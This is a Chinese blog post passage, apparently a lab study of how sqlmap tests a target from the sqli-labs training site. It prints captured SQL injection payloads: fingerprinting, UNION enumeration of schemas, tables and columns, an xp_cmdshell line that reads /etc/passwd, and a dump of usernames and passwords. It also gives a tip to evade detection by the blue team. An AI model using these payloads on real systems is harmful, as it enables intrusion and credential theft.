<p>在 sqlmap 使用 **–proxy=”<a href="http://127.0.0.1:8080&quot;">http://127.0.0.1:8080&quot;</a> ** 参数即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE1.png">    </p>
<p>在上面我们会发现，<strong>User-Agent：sqlmap/1.5.8#stable (http: //sqlmap.org)</strong>  ,这样的头部内容在web 日志里很容易引起蓝方的怀疑。所以我们再加上 <strong>–random-agent</strong> 参数，自动生成合适的 <strong>User-Agent</strong>，效果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE15.png">    </p>
<p>2.首先，sqlmap 会先发送多遍正常的请求，确认测试目标URL内容是否稳定（相当于刷新）</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE16.png">    </p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE1.png">    </p>
<p>3.然后开始下一项测试，这次发送的id变成了 7115 。意思是 测试获取参数“id”是否为动态，然后得出结论: 获取参数“id”似乎是动态的 （在改变 id 后观察页面是否相同）</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE17.png">    </p>
<p>4.检测数据库类型</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE19.png"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是它使用的payload  ?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">29</span><span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">28.</span><span class="operator">%</span><span class="number">28</span><span class="operator">%</span><span class="number">2</span>C<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">29.</span><span class="operator">%</span><span class="number">29</span> URL解码后： )&quot;(.(,&#x27;).)</span><br></pre></td></tr></table></figure>



<p>5.下一项检测是否存在 XSS </p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE18.png">发送了测试代码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>mJUs<span class="operator">=</span><span class="number">1481</span><span class="operator">%</span><span class="number">20</span><span class="keyword">AND</span><span class="operator">%</span><span class="number">201</span><span class="operator">%</span><span class="number">3</span>D1<span class="operator">%</span><span class="number">20</span><span class="keyword">UNION</span><span class="operator">%</span><span class="number">20</span><span class="keyword">ALL</span><span class="operator">%</span><span class="number">20</span><span class="keyword">SELECT</span><span class="operator">%</span><span class="number">201</span><span class="operator">%</span><span class="number">2</span>CNULL<span class="operator">%</span><span class="number">2</span>C<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">3</span>Cscript<span class="operator">%</span><span class="number">3</span>Ealert<span class="operator">%</span><span class="number">28</span><span class="operator">%</span><span class="number">22</span>XSS<span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">29</span><span class="operator">%</span><span class="number">3</span>C<span class="operator">%</span><span class="number">2</span>Fscript<span class="operator">%</span><span class="number">3</span>E<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">2</span>Ctable_name<span class="operator">%</span><span class="number">20</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">20</span>information_schema.tables<span class="operator">%</span><span class="number">20</span><span class="keyword">WHERE</span><span class="operator">%</span><span class="number">202</span><span class="operator">%</span><span class="number">3E1</span><span class="comment">--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1&quot; 200 721</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE2.png"></p>
<p>其中一些代码进行了URL编码，解码后得到：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>mJUs<span class="operator">=</span><span class="number">1481</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;</span>,table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> <span class="number">2</span><span class="operator">&gt;</span><span class="number">1</span><span class="comment">--/**/; EXEC xp_cmdshell(&#x27;cat ../../../etc/passwd&#x27;)# HTTP/1.1&quot; 200 721</span></span><br></pre></td></tr></table></figure>



<p>5.下面开始进行注入测试，如果没有指定sqlmap使用哪一种注入方式，它会将所有的注入方式都跑一遍。而且会按以下顺序进行注入，这就是为什么我们使用的sqlmap总喜欢用布尔盲注的原因。sqlmap中有以下几种注入方式</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--technique 参数</span></span><br><span class="line">B: <span class="type">Boolean</span><span class="operator">-</span>based blind <span class="keyword">SQL</span> injection（布尔型注⼊）</span><br><span class="line">E: Error<span class="operator">-</span>based <span class="keyword">SQL</span> injection（报错型注⼊）</span><br><span class="line">U: <span class="keyword">UNION</span> query <span class="keyword">SQL</span> injection（可联合查询注⼊）</span><br><span class="line">S: Stacked queries <span class="keyword">SQL</span> injection（可多语句查询注⼊）</span><br><span class="line">T: <span class="type">Time</span><span class="operator">-</span>based blind <span class="keyword">SQL</span> injection（基于时间延迟注⼊）</span><br><span class="line">Q: inline_query <span class="keyword">SQL</span> injection(内联注⼊)</span><br></pre></td></tr></table></figure>



<ol start="6">
<li>在文件<code>boundaries.xml</code> 中选取合适的闭合方式，里面都是单引号，双引号，括号等等符号的组合。 在文件<code>sqlmap/data/xml/payloads</code>下选取对应的payload。所以梳理⼀下思路，我们最终会发送给⽬标服务器的payload ，不过首先要先闭合，在文件<code>boundaries.xml</code> 中，然后从对应的注入类型的模板中提取对应参数，如布尔盲注模板，然后再到<code>queries.xml</code>中取出想要的表达式，最后有必要的话使用 temper 对payload 进行修饰，最后输出的就是一个完整的 payload 。</li>
</ol>
<p><strong>以下是sqlmap一次完整的注入</strong></p>
<p>7.查字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 1-- -</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">6488</span><span class="comment">-- -</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 10-- -</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">6</span><span class="comment">-- -</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 4-- -</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">3</span><span class="comment">-- -</span></span><br></pre></td></tr></table></figure>



<p>8.查数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,0x57546868445661497a474b574369506768417a597064667a614557616f6a754870464c64544e464a,0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> CONCAT(<span class="number">0x717a6a6a71</span>,<span class="number">0x6b4158546d48415a41496e48596448615867594e49525374436954664d5574505871726d51455279</span>,<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION ALL SELECT NULL,NULL,CONCAT(0x717a6a6a71,0x464843574f4973414372614d414a73595970426c5177534767687050454a4a5647795a5375445a61,0x7162706a71)-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,<span class="number">0x57525a45435572416663</span>,<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION ALL SELECT CONCAT(0x717a6a6a71,0x5a70654458455a6e7344,0x7162706a71),NULL,NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,<span class="number">0x55626b6e586165436468</span>,<span class="number">0x7162706a71</span>)<span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-4234</span><span class="string">&#x27; UNION ALL SELECT CONCAT(0x717a6a6a71,0x766455794f71597656557757576c4c6d6447656975464946565576714c47486d5852766154455359,0x7162706a71),NULL,NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-9821&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,<span class="number">0x726557794d7a476c4d5975697274766d704845684c646f68746a6e674e6a66436a77774a4e5a4455</span>,<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-6633</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,(CASE WHEN (2947=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                2947) THEN 1 ELSE 0 END),0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-5741&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (VERSION() <span class="keyword">LIKE</span> <span class="number">0x254d61726961444225</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>),<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-9889</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-4073&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (@<span class="variable">@VERSION</span>_COMMENT <span class="keyword">LIKE</span> <span class="number">0x256472697a7a6c6525</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>),<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-4680</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-9973&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (AURORA_VERSION() <span class="keyword">LIKE</span> <span class="number">0x25</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>),<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-3008</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-5854&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,<span class="built_in">JSON_ARRAYAGG</span>(CONCAT_WS(<span class="number">0x6a77756c7677</span>,schema_name)),<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA<span class="comment">-- -</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>9.查表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-4170</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,JSON_ARRAYAGG(CONCAT_WS(0x6a77756c7677,table_name)),0x7162706a71),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x7365637572697479)-- -</span></span><br></pre></td></tr></table></figure>



<p>10.查字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-8178</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,JSON_ARRAYAGG(CONCAT_WS(0x6a77756c7677,column_name,column_type)),0x7162706a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x7365637572697479-- -</span></span><br></pre></td></tr></table></figure>



<p>11.字段内容数据脱库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-3449</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,JSON_ARRAYAGG(CONCAT_WS(0x6a77756c7677,id,password,username)),0x7162706a71),NULL FROM security.users-- -</span></span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">MTRleed</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.mtrleed.top/post/7/">https://www.mtrleed.top/post/7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.mtrleed.top" target="_blank">MTRleed</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B3%A8%E5%85%A5/">注入</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/sql%E6%B3%A8%E5%85%A5.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/post/8/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/xss.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">XSS学习(捎带CSRF/CSRF)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/10/" title="JNDI注入"><img class="cover" src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/JNDI.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-27</div><div class="title">JNDI注入</div></div></a></div><div><a href="/post/1/" title="对某公司渗透实测"><img class="cover" src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2021/82qa8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-07</div><div class="title">对某公司渗透实测</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A4%E8%AF%86sql%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">认识sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">sql注入类型详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8length-%E5%87%BD%E6%95%B0%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="toc-number">3.1.</span> <span class="toc-text">1.使用length()函数猜数据库名长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8ascii%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">3.2.</span> <span class="toc-text">2.利用ascii猜数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%8C%9C%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">3.3.</span> <span class="toc-text">3.猜字段名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-%E9%9D%B6%E5%9C%BA"><span class="toc-number">4.</span> <span class="toc-text">sqli 靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E6%98%BE%E9%94%99%E6%8A%A5%E9%94%99"><span class="toc-number">4.1.</span> <span class="toc-text">1关：’ 闭合 显错报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%85%B3%EF%BC%9A%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">2关：数字型注入  显错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%85%B3-%E2%80%98-%E9%97%AD%E5%90%88-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.</span> <span class="toc-text">**3关: ‘) 闭合 显错注入 **</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E5%85%B3%EF%BC%9A%E2%80%9D-%E9%97%AD%E5%90%88-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.</span> <span class="toc-text">4关：”) 闭合 显错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.</span> <span class="toc-text">5关：’ 闭合 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E5%85%B3%EF%BC%9A%E2%80%9D-%E9%97%AD%E5%90%88-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.6.</span> <span class="toc-text">6关：” 闭合 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E5%85%B3%EF%BC%9A-%E2%80%9C-%E9%97%AD%E5%90%88-%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">4.7.</span> <span class="toc-text">7关： “)) 闭合  文件写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.8.</span> <span class="toc-text">8关：’ 闭合 布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.9.</span> <span class="toc-text">9关：’ 闭合 时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10%E5%85%B3%EF%BC%9A%E2%80%9D-%E9%97%AD%E5%90%88-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.10.</span> <span class="toc-text">10关：” 闭合 时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.11.</span> <span class="toc-text">11关：’ 闭合 显错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12%E5%85%B3%EF%BC%9A%E2%80%9D-%E9%97%AD%E5%90%88-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%8C-%E5%90%8C11%E5%85%B3"><span class="toc-number">4.12.</span> <span class="toc-text">12关：”) 闭合 显错注入， 同11关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.13.</span> <span class="toc-text">13关：’) 闭合 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14%E5%85%B3%EF%BC%9A%E2%80%9D-%E9%97%AD%E5%90%88-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%90%8C13%E5%85%B3"><span class="toc-number">4.14.</span> <span class="toc-text">14关：” 闭合 报错注入，同13关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%8C%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">4.15.</span> <span class="toc-text">**15关：’ 闭合 布尔盲注，延时注入 **</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16%E5%85%B3%EF%BC%9A%E2%80%9D-%E9%97%AD%E5%90%88-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%8C%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5-%E5%90%8C15%E5%85%B3"><span class="toc-number">4.16.</span> <span class="toc-text">16关：” 闭合 布尔盲注，延时注入 同15关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-%E5%90%8C13%E5%85%B3"><span class="toc-number">4.17.</span> <span class="toc-text">17关：’ 闭合 报错注入 同13关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18%E5%85%B3%EF%BC%9AHTTP-%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5-User-Agent"><span class="toc-number">4.18.</span> <span class="toc-text">18关：HTTP 头部注入  User-Agent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19%E5%85%B3%EF%BC%9AHTTP-%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5-Referer"><span class="toc-number">4.19.</span> <span class="toc-text">19关：HTTP 头部注入 Referer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20%E5%85%B3%EF%BC%9AHTTP-%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5-Cookie-%E2%80%99-%E9%97%AD%E5%90%88-%E6%98%BE%E9%94%99"><span class="toc-number">4.20.</span> <span class="toc-text">20关：HTTP 头部注入 Cookie  ’ 闭合 显错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21%E5%85%B3%EF%BC%9AHTTP-%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5-%E2%80%98%EF%BC%89-%E9%97%AD%E5%90%88-%E8%BF%87base64%E7%9A%84Cookie"><span class="toc-number">4.21.</span> <span class="toc-text">21关：HTTP 头部注入 ‘） 闭合 过base64的Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22%E5%85%B3%EF%BC%9AHTTP-%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5-%E2%80%9D-%E9%97%AD%E5%90%88-%E8%BF%87base64%E7%9A%84Cookie"><span class="toc-number">4.22.</span> <span class="toc-text">22关：HTTP 头部注入 ” 闭合 过base64的Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23%E5%85%B3%EF%BC%9Aget-%E8%AF%B7%E6%B1%82-%E8%BF%87%E6%BB%A4%E4%BA%86%E6%B3%A8%E9%87%8A%E7%AC%A6-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.23.</span> <span class="toc-text">23关：get 请求 过滤了注释符  显错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24%E5%85%B3%EF%BC%9A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">4.24.</span> <span class="toc-text">24关：二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25%E5%85%B3%EF%BC%9Aand-%E5%92%8C-or-%E8%A2%AB%E8%BF%87%E6%BB%A4-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.25.</span> <span class="toc-text">25关：and 和 or 被过滤 显错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25a%E5%85%B3%EF%BC%9A%E5%92%8C25%E6%96%B9%E6%B3%95%E4%B8%80%E6%A0%B7%EF%BC%8C%E5%8F%AA%E6%98%AF%E8%BF%99%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.26.</span> <span class="toc-text">25a关：和25方法一样，只是这是数字型 显错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26%E5%85%B3%EF%BC%9A%E8%BF%87%E6%BB%A4%E4%BA%86-or%EF%BC%8Cand-%EF%BC%8C-%E2%80%93-%E7%A9%BA%E6%A0%BC-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.27.</span> <span class="toc-text">26关：过滤了 or，and ， &#x2F; , – , # , 空格 , &#x2F;   报错注入，显错注入*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 